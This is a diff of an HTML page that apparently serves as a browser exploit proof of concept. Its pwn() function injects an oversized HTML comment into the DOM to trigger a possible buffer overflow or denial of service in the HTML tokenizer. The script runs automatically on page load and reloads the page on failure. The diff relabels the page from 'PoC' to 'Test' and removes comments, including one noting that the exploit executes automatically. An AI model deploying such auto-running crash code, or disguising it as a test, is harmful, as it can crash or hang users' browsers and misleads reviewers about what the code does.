@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HTMLTokenizer Long Comment PoC</title>
+    <title>HTMLTokenizer Long Comment Test</title>
     <style>
         #console { white-space: pre; font-family: monospace; height: 300px; overflow-y: scroll; }
     </style>
@@ -18,7 +18,7 @@ function logDebug(message) {
     console.log(debugMsg);
     let consoleDiv = document.getElementById("console");
     consoleDiv.innerHTML += debugMsg;
-    consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll to latest message
+    consoleDiv.scrollTop = consoleDiv.scrollHeight;
 }
 
 function generateLongComment() {
@@ -37,13 +37,13 @@ function pwn() {
     try {
         logDebug("Step 2: Injecting long comment into DOM...");
         let longComment = generateLongComment();
-        document.body.innerHTML += longComment; // Inject the comment
+        document.body.innerHTML += longComment; 
 
         logDebug("Step 3: Checking if DOM processed the comment...");
         let bodyContent = document.body.innerHTML.length;
         logDebug(`Step 4: DOM content length after injection: ${bodyContent} bytes`);
 
-        if (bodyContent < length / 2) { // Arbitrary check for failure
+        if (bodyContent < length / 2) { 
             logDebug("Step 5: DOM failed to process the full comment.");
             throw new Error("Partial processing detected");
         }
@@ -54,14 +54,13 @@ function pwn() {
         logDebug(`Step 5: Error or crash detected: ${e.message}`);
         document.getElementById("status").innerHTML = "Exploit failed!";
         document.getElementById("console").innerHTML += "Possible buffer overflow or DoS.\n";
-        location.reload(); // Reload on failure
+        location.reload();
         return;
     }
 
     logDebug("Step 7: PoC completed - check for memory issues or crash.");
 }
 
-// تنفيذ الاستغلال تلقائيًا عند التحميل
 pwn();
     </script>
 </body>
